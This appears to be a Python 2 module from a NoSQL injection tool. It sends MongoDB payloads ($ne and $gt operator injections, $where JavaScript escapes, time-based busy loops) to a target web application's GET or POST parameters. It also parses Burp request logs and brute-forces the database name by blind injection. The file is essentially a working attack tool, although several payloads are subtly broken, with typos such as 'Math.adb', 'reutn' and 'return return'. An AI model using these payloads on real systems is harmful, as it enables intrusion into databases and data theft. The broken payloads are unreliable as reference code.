#!/usr/bin/python
# -*- coding: utf-8 -*-
# __author__: sixwhale
import codecs
import getopt
import inspect
import os
import random
import re
import requests
import string
import sys
import time
from Lib.common import checkFile
from Lib.common import extractRegexResult
from Lib.common import filterStringValue
from Lib.common import getPublicTypeMembers
from Lib.common import getUnicode
from Lib.common import getQuesMsg
from Lib.common import isListLike
from Lib.common import openFile
from Lib.common import printErrMsg
from Lib.common import printInfoMsg
from Lib.common import printWarnMsg
from Lib.enums import HTTPMETHOD
from Lib.enums import HTTP_HEADER
from Lib.setting import BURP_REQUEST_REGEX
from Lib.setting import BURP_XML_HISTORY_REGEX
from Lib.setting import CRAWL_EXCLUDE_EXTENSIONS
from Lib.setting import CUSTOM_INJECTION_MARK_CHAR
from Lib.setting import HEADERS
from Lib.setting import PROBLEMATIC_CUSTOM_INJECTION_PATTERNS
from Lib.setting import TAG_NO
from Lib.setting import TAG_YES
from pymongo import MongoClient


def InjectOption(url, reqFile):
	if url == None:
		#printErrMsg('[Error] The function is testing, waitting for me :)')
		postWeb(reqFile)
	elif reqFile == None:
		getWeb(url)
	else:
		printErrMsg('[Error] Check the required options......')
		return

def postWeb(reqFile):
	print '[*] Start web app attacks (POST)'

	global testNum
	testNum = 1
	global httpMethod
	httpMethod = 'POST'
	global possAddrs
	possAddrs = []
	global validAddrs
	validAddrs = []
	global addedTarget
	addedTarget = dict()
	global paramNames
	paramNames = []
	global paramValues
	paramValues = []
	appUp = False
	strAttack = False
	intAttack = False

	checkFile(reqFile)
	try:
		with openFile(reqFile,'rb') as f:
			content = f.read()
	except:
		printErrMsg('[Error] Something went wrong while trying to read the content of file \'%s\'' % reqFile)
		return
	parseBurpLog(content)
	if not addedTarget['url'] or not addedTarget['data']:
		printErrMsg('[Error] Unable to find usable request(s), in provided file (\'%s\')' % reqFile)
		return

	print '[*] Testing connection to the target URL.'
	url = addedTarget['url']
	buildPostdata(url,addedTarget['data'])

	printInfoMsg('[+] Valid URLs:')
	for url in validAddrs:
		printInfoMsg('    %s' % url)
			
	print '\n '
	printInfoMsg('[+] Possible URLs:')
	for url in possAddrs:
		printInfoMsg('    %s' % url)	

def buildPostdata(url,data):
	postParams = dict()
	injectName = []
	postData = data
	global testNum
	testNum = 1
	global neDict
	global gtDict
	
	params = postData.split('&')
	for item in params:
		index = item.find('=')
		postParams[item[0:index]] = item[index+1:len(item)]
	try:
		req = requests.post(url,data=postParams,headers=HEADERS)
		if req.status_code == 200:
			appUp = True
			start = time.time()
			req = requests.post(url,data=postParams,headers=HEADERS)
			resLength = int(len(req.content))
			end = time.time()
			reqTime = round((end - start), 3)

			print '[*] App is up, got response length of %s' % resLength
		else:
			printErrMsg('[Error] Got %s from the app, check your options.' % req.status_code)
			return

	except Exception, e:
		printErrMsg('[Error] %s. Looks like the server didn\'t respond.  Check your options.' % e)
		return
	if appUp == True:
		index = 1
		printInfoMsg('[+] List of post params:')
		for params in postParams:
			print '    [%s] %s' % (index, params)
			index += 1
		try:
			injectIndex = getQuesMsg('Choose a parmeter to inject: ')
			injOpt = postParams.keys()[int(injectIndex)-1]
		except Exception, e:
			printErrMsg('[Error] %s. Somthing wrong... Check inject parmeters.' % e)
			return
		injectSize = getQuesMsg('[*] Input test random string size: ')
		injectstr = getInjectStr(int(injectSize))
		postParams[injOpt] = injectstr

		req = requests.post(url,data=postParams,headers=HEADERS)
		basedInjectLength = int(len(req.content))
		print '[*] Got response length of %s.' % basedInjectLength

		LengthDelta = abs(resLength - basedInjectLength)
		if LengthDelta == 0:
			print '[*] No change in response size injecting a random parameter..'

		#Test 1 Generate not equals injection
		neDict = postParams
		neDict[injOpt+'[$ne]'] = neDict[injOpt]
		del neDict[injOpt]
		req = requests.post(url, data=neDict, headers=HEADERS)
		printWarnMsg('[*] Testing Mongo PHP not equals associative array injection...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		# Test 2 generate $gt injection
		gtDict = postParams
		gtDict.update({injOpt:''})
		gtDict[injOpt+'[$gt]'] = gtDict[injOpt]
		del gtDict[injOpt]
		req = requests.post(url,data=gtDict,headers=HEADERS)
		printWarnMsg('[*] Testing PHP/ExpressJS >Undefined Injection...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1

		#Test 3
		postParams.update({injOpt:"a'; return db.a.find(); var v='!"})
		req = requests.post(url,data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		#Test 4
		postParams.update({injOpt:"1; return db.a.find(); var v=1"})
		req = requests.post(url, data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		#Test 5 a single record attack in case the app expects only one record back
		postParams.update({injOpt:"a'; return db.a.findOne(); var v='!"})
		req = requests.post(url, data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		#Test 6
		postParams.update({injOpt:"1; return db.a.findOne(); var v='!"})
		req = requests.post(url,data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript integer escape attack for one record...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		#Test 7
		postParams.update({injOpt:"a'; return return this.a !='%s'; var v='!" % injectstr})
		req = requests.post(url,data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo this not equals string escape attack for all records...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1

		#Test 8
		postParams.update({injOpt:"1; return return this.a !='%s'; var v='!" % injectstr})
		req = requests.post(url,data=postParams,headers=HEADERS)
		printWarnMsg('[*] Testing Mongo this not equals integer escape attack for all records...')
		errorCheck = errorTest(req.content,testNum)

		if errorCheck == False:
			injLen = int(len(req.content))
			checkResult(basedInjectLength,injLen,testNum,postParams)
			testNum += 1
		else:
			testNum += 1


		doTimeAttack = getQuesMsg('[*] Starting based time attack? (y/n)')
		if doTimeAttack in TAG_YES:
			#整型
			printWarnMsg('[*] Starting Javascript integer escape time based injection...')
			postParams.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var v=1"})
			startTime = time.time()
			req = requests.post(url, data=postParams, headers=HEADERS)
			page = req.content
			endTime = time.time()
			timeDelta = (int(round((endTime - startTime), 3)) - reqTime)

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				intAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				intAttack = False

			#String
			printWarnMsg('[*] Starting Javascript string escape time based injection...')
			postParams.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var v=1"})
			startTime = time.time()
			req = requests.post(url, data=postParams, headers=HEADERS)
			page = req.content
			endTime = time.time()
			timeDelta = (int(round((endTime - startTime), 3)) - reqTime)

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				strAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				strAttack = False

def getWeb(url):
	print '[*] Start web app attacks (GET)'
	
	global testNum
	testNum = 1
	global httpMethod
	httpMethod = 'GET'
	global possAddrs
	possAddrs = []
	global validAddrs
	validAddrs = []
	global lt24
	lt24 = False
	global str24
	str24 = False
	global int24
	int24 = False
	appUp = False
	strAttack = False
	intAttack = False

	print '[*] Checking url if correct......'
	if '?' not in url or '=' not in url:
		printErrMsg('[Error] No URL  parameters provided for GET request...Check your url.\n')
		return
	print '[*] Checking status if site at \'%s\' is up......' % url
	try:
		req = requests.get(url,headers=HEADERS)
		resCode = req.status_code
		#print type(resCode )
		if resCode == 200:	
			startTime = time.time()
			content = req.content
			endTime = time.time()
			resLength = int(len(content))

			reqTime = int(round((endTime-startTime), 3))

			print '[*] App is up, got response length of %s, and response time of %s seconds, starting inject test.' % (resLength, reqTime)
			appUp = True

		else:
			printErrMsg('[Error] Got %s code from app, check your options.' % resCode)
	except Exception, e:
		printErrMsg('[Error] %s, looks like the server didn\'t respond, check your options.' % e)
	if appUp == True:
		injectSize = getQuesMsg('[*] Input test random string size: ')
		injectstr = getInjectStr(int(injectSize))

		basedInjectUrl = buildUrl(url, injectstr)
		print '[*] Based inject url is %s' % basedInjectUrl
		req = requests.get(basedInjectUrl,headers=HEADERS)

		basedInjectLength = int(len(req.content))
		print '[*] Got response length of %s' % basedInjectLength
		deltaLenth = abs(resLength-basedInjectLength)

		if deltaLenth == 0:
			print '[*] No change in response size injecting a random parameter..\n'
		else:
			print '[*] Random value variance: %s' % deltaLenth

		#Test 1
		printWarnMsg('[*] Testing Mongo PHP not equals associative array injection...')
		print '[*] Injecting %s' % urlArray[1]
		req = requests.get(urlArray[1], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1

		#Test 2
		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
		print '[*] Injecting %s' % urlArray[2]
		req = requests.get(urlArray[2], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 3
		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
		print '[*] Injecting %s' % urlArray[3]
		req = requests.get(urlArray[3], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 4
		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
		print '[*] Injecting %s' % urlArray[4]
		req = requests.get(urlArray[4], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 5
		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for one record...')
		print '[*] Injecting %s' % urlArray[5]
		req = requests.get(urlArray[5], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 6
		printWarnMsg('[*] Testing Mongo this not equals string escape attack for all records...')
		print '[*] Injecting %s' % urlArray[6]
		req = requests.get(urlArray[6], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 7
		printWarnMsg('[*] Testing Mongo this not equals integer escape attack for all records...')
		print '[*] Injecting %s' % urlArray[7]
		req = requests.get(urlArray[7], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1


		#Test 8
		printWarnMsg('[*] Testing  PHP/ExpressJS > undefined attack for all records...')
		print '[*] Injecting %s' % urlArray[8]
		req = requests.get(urlArray[8], headers=HEADERS)
		errorcheck = errorTest(str(req.content), testNum)

		if errorcheck == False:
			injectLength = int(len(req.content ))
			checkResult(basedInjectLength,injectLength,testNum,None)
			testNum += 1
		else:
			testNum += 1

		doTimeAttack = getQuesMsg('[*] Starting based time attack? (y/n)')

		if doTimeAttack in TAG_YES:
			#整型
			printWarnMsg('[*] Starting Javascript integer escape time based injection...')
			startTime = time.time()
			req = requests.get(urlArray[9], headers=HEADERS)
			page = req.content
			endTime = time.time()
			timeDelta = int(round(endTime - startTime,3)) - reqTime

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				strAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				strAttack = False

			#字符串
			printWarnMsg('[*] Starting Javascript string escape time based injection...')
			startTime = time.time()
			req = requests.get(urlArray[10], headers=HEADERS)
			page = req.content
			endTime = time.time()
			timeDelta = int(round(endTime - startTime,3)) - reqTime

			if timeDelta > 25:
				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
				strAttack = True
			else:
				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
				strAttack = False

			if lt24 == True:
				print '[*] MongoDB < 2.4.0 detected. Starting brute forcing database info.'
				getDBInfo()

		printInfoMsg('[+] Valid URLs:')
		for url in validAddrs:
			printInfoMsg('    %s' % url)
			
		print '\n '
		printInfoMsg('[+] Possible URLs:')
		for url in possAddrs:
			printInfoMsg('    %s' % url)

def errorTest(errorcheck, testNum):
	global possAddrs #可能有效
	global httpMethod 
	global neDict
	global gtDict

	if errorcheck.find('ReferenceError') != -1 or errorcheck.find('SyntaxError') != -1 or errorcheck.find('ILLEGAL') != -1:
		print '[*] Injection returned a MongoDB Error. Injection may be possible.'
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
			return True
		else:
			if testNum == 1:
				possAddrs.append(str(neDict))
				return True
			elif testNum == 2:
				possAddrs.append(str(gtDict))
				return True
			else:
				possAddrs.append(str(postParams))
				return True
	else:
		return False


def checkResult(baseSize,injectSize,testNum,postData):
	global validAddrs #有效
	global possAddrs
	global httpMethod
	global neDict
	global gtDict

	delta = abs(baseSize-injectSize)
	if (delta >= 100) and (injectSize != 0):
		printInfoMsg('[*] Response varied %s bytes from random parameter value! Injection works!' % delta)
		if httpMethod == 'GET':
			validAddrs.append(urlArray[testNum])
		else:
			if testNum == 1:
				validAddrs.append(str(neDict))
			elif testNum == 2:
				validAddrs.append(str(gtDict))
			else:
				validAddrs.append(str(postData))
		if testNum == 2 or testNum == 4:
			lt24 = True
			str24 = True
		elif testNum == 3 or testNum == 5:
			lt24 = True
			int24 = True
		return

	elif (delta < 100) and (delta > 0) and (injectSize != 0):
		print '[*] Response variance was only %s bytes. Injection returned a MongoDB Error. Injection may be possible.' % delta
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
		else:
			if testNum == 1:
				possAddrs.append(str(neDict))
			else:
				possAddrs.append(str(postData))
		return

	elif delta == 0:
		print '[*] Injection did not work.'
		return

	else:
		print '[*] Injected response was smaller than random response. Injection may be possible.'
		if httpMethod == 'GET':
			possAddrs.append(urlArray[testNum])
		else:
			if testNum == 1:
				possAddrs.append(str(neDict))
			else:
				possAddrs.append(str(postData))
		return 

def getInjectStr(size):
	print '''[*] What format should the random string take?
    [1] mixed (letters, numbers)
    [2] letters only'
    [3] number only'''

	format = True
	while format:
		format = getQuesMsg('[*] choose: ')
		if format == '1':
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size))
		elif format == '2':
			chars = string.ascii_letters
			return ''.join(random.choice(chars) for x in range(size))
		elif format == '3':
			chars = string.digits
			return ''.join(random.choice(chars) for x in range(size))
        else:
        	format = True
        	printErrMsg('[Error] Invalid section.')


def buildUrl(url, value):
	global urlArray
	urlArray = ['','','','','','','','','','','','']
	paramNames = []
	paramValues = []
	injectParams = []

	try:
		split_url = url.split('?')
		params = split_url[1].split('&')
	except:
		printErrMsg('[Error] Not able to parse the URL and parameters. Check the url')
		return

	for item in params:
		index = item.find('=')
		paramNames.append(item[0:index])
		paramValues.append(item[index + 1:len(item)])

	printInfoMsg('[+] List of parameters:')
	index = 1
	for name in paramNames:
		print '    [%s] %s' % (index,name)
		index += 1

	try:
		injectIndex = getQuesMsg('[*] Choose parmeters to inject (such as 1,2,3):')
		#print injectIndex.split(',')
		for i in injectIndex.split(','):
			injectParams.append(paramNames[int(i)-1])
	except Exception, e:
		printErrMsg('[Error] %s. Somthing wrong... Check inject parmeters.' % e)
		return 

	x = 0
	for i in range(12):
		urlArray[i] = split_url[0] + '?'

	for item in params:
		if paramNames[x] in injectParams:
			urlArray[0] += paramNames[x] + "=" + value + "&"
			urlArray[1] += paramNames[x] + "[$ne]=" + value + "&"			
			urlArray[2] += paramNames[x] + "=a'; return db.a.find(); var v='!" + "&"
			urlArray[3] += paramNames[x] + "=1; return db.a.find(); var v=1" + "&"
			urlArray[4] += paramNames[x] + "=a'; return db.a.findOne(); var v='!" + "&"
			urlArray[5] += paramNames[x] + "=1; return db.a.findOne(); var v=1" + "&"
			urlArray[6] += paramNames[x] + "=a'; return this.a !='" + value + "'; var v='!" + "&"
			urlArray[7] += paramNames[x] + "=1; return this.a !=" + value + "; var v=1" + "&"
			urlArray[8] += paramNames[x] + "[$gt]=&"
			#based time
			urlArray[9] += paramNames[x] + "=1; var date=new Date(); var cur=null; do{cur=new Date();} while((Math.adb(date.getTime()-cur.getTime()))/1000<10); reutn; var v=1" + "&"
			urlArray[10] += paramNames[x] + "=a'; var date=new Date(); var cur=null; do{cur=new Date();} while((Math.adb(date.getTime()-cur.getTime()))/1000<10); reutn; var v='!" + "&"
			urlArray[11] += paramNames [x] + "=a'; ---"
		else:
			for i in range(12):
				urlArray[i] += paramNames[x] + "=" + paramValues[x] + "&"
		x += 1

	#把URL中多余的&去掉
	x = 0
	while x < 12:
		urlArray[x] = urlArray[x][:-1]
		x += 1

	return urlArray[0]


def getDBInfo():
	getDBnameLen = False
	getDBname = False
	DBnameLen = 0
	nameCount = 0
	charCount = 0
	dbName = ''

	chars = string.ascii_letters + string.digits
	trueUrl = urlArray[11].replace("---","return true; var v ='!" + "&")
	req = requests.get(urlArray[11], headers=HEADERS)
	baseLen = int(len(req.content))

	print '[*] Calculating the length of the database name.'

	while getDBnameLen == False:
		calcUrl = urlArray[11].replace("---","if(db.getName().length==%s) {return true;} var v='a&" % DBnameLen)
		req = requests.get(calcUrl)
		UrlLen = int(len(req.content))

		if UrlLen == baseLen:
			print '[*] Got database name length of %s characters.' % DBnameLen
			getDBnameLen = True
		else:
			DBnameLen += 1

	printInfoMsg('[+] Database name is: '),
	while getDBname == False:
		calcUrl = urlArray[11].replace("---","if(db.getName()[%s]==chars[%s]){return true;} var v='a&" % (nameCount,charCount))
		req = requests.get(calcUrl)
		UrlLen = int(len(req.content))

		if UrlLen == baseLen:
			dbName += chars[charCount]
			print  dbName,
			nameCount += 1
			charCount = 0

			if nameCount == DBnameLen:
				getDBname = True
		else:
			charCount += 1



def parseBurpLog(content):
	if not re.search(BURP_REQUEST_REGEX, content, re.I | re.S):
		if re.search(BURP_XML_HISTORY_REGEX, content, re.I | re.S):
			reqResList = []
			for match in re.finditer(BURP_XML_HISTORY_REGEX, content, re.I | re.S):
				port, request = match.groups()
				try:
					request = request.decode("base64")
				except binascii.Error:
					continue
				_ = re.search(r"%s:.+" % re.escape('Host'), request)
				if _:
					host = _.group(0).strip()
					if not re.search(r":\d+\Z", host):
						request = request.replace(host, "%s:%d" % (host, int(port)))
				reqResList.append(request)
		else:
			reqResList = [content]
	else:
		reqResList = re.finditer(BURP_REQUEST_REGEX, content, re.I | re.S)
	
	for match in reqResList:
		request = match if isinstance(match, basestring) else match.group(0)
		request = re.sub(r"\A[^\w]+","",request)
		schemePort = re.search(r"(http[\w]*)\:\/\/.*?\:([\d]+).+?={10,}",request, re.I | re.S)
		if schemePort:
			scheme = schemePort.group(1)
			port = schemePort.group(2)
		else:
			scheme, port = None, None 
		if not re.search(r"^[\n]*(%s).*?\sHTTP\/" % "|".join(getPublicTypeMembers(HTTPMETHOD, True)), request, re.I | re.M):
			continue
		if re.search(r"^[\n]*%s.*?\.(%s)\sHTTP\/" % ('GET', "|".join(CRAWL_EXCLUDE_EXTENSIONS)), request, re.I | re.M):
			continue

		getPostReq = False
		url = None
		host = None
		method = None
		data = None
		cookie = None
		params = False
		newline = None
		lines = request.split('\n')
		headers = []

		for index in xrange(len(lines)):
			line = lines[index]
			if not line.strip() and index == len(lines) - 1:
				break
			newline = "\r\n" if line.endswith('\r') else '\n'
			line = line.strip('\r')
			match = re.search(r"\A(%s) (.+) HTTP/[\d.]+\Z" % "|".join(getPublicTypeMembers(HTTPMETHOD, True)), line) if not method else None
			if len(line.strip()) == 0 and method and method != HTTPMETHOD.GET and data is None:
				data = ''
				params = True
			elif match:
				method = match.group(1)
				url = match.group(2)
				if any(_ in line for _ in ('?', '=', CUSTOM_INJECTION_MARK_CHAR)):
					params = True
				getPostReq = True
			#POST parameters
			elif data is not None and params:
				data += '%s%s' % (line, newline)
			#GET parameters
			elif '?' in line and '=' in line and ": " not in line:
				params = True
			#Headers 
			elif re.search(r"\A\S+:", line):
				key, value = line.split(':',1)
				value = value.strip().replace('\r','').replace('\n','')

				#Cookie and Host headers
				if key.upper() == HTTP_HEADER.COOKIE.upper():
					cookie = value
				elif key.upper() == HTTP_HEADER.HOST.upper():
					if '://' in value:
						schemePort, value = value.split('://')[:2]
					splitValue = value.split(':')
					host = splitValue[0]

					if len(splitValue) > 1:
							port = filterStringValue(splitValue[1], "[0-9]")
				if key.upper() == HTTP_HEADER.CONTENT_LENGTH.upper():
					params = True
					headers.append((getUnicode(key), getUnicode(value)))
				elif key not in (HTTP_HEADER.PROXY_CONNECTION, HTTP_HEADER.CONNECTION):
					headers.append((getUnicode(key), getUnicode(value)))
				if CUSTOM_INJECTION_MARK_CHAR in re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", value or ""):
					params = True 
		data = data.rstrip('\r\n') if data else data

		if getPostReq and (params or cookie):
			if not port and isinstance(scheme, basestring) and scheme.lower() == 'https':
				port = '443'
			elif not scheme and port == '443':
				scheme = 'https'
			if not host:
				printErrMsg('[Error] Invalid format of a request file')
			if not url.startswith("http"):
				url = "%s://%s:%s%s" % (scheme or "http", host, port or "80", url)
				scheme, port = None, None 
			if not(None and not re.search(None, url, re.I)):
				addedTarget['data'] = data
				addedTarget['cookie'] = cookie
				addedTarget['method'] = method
				addedTarget['headers'] = tuple(headers)
				addedTarget['url'] = url
